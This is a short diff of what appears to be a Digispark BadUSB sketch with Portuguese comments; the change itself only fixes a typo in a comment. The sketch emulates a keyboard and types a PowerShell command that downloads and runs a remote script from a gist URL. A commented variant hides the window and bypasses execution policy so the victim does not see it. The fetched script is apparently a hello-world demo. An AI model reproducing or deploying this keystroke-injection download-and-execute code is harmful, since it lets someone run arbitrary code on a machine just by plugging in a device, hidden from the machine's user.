@@ -14,7 +14,7 @@ void loop() {
   DigiKeyboardPtBr.delay(500);
   DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
   DigiKeyboardPtBr.delay(3000); 
-  // Faz o dwnload e executa o script publicado no gist
+  // Faz o download e executa o script publicado no gist
   DigiKeyboardPtBr.print(F("powershell \"IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/SEU_USUARIO/ScriptOlaMundo.ps1');\""));
   // Caso queira esconder o resultado do script.
   //DigiKeyboardPtBr.print(F("powershell -W hidden -noni -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/SEU_USUARIO/ScriptOlaMundo.ps1');\""));
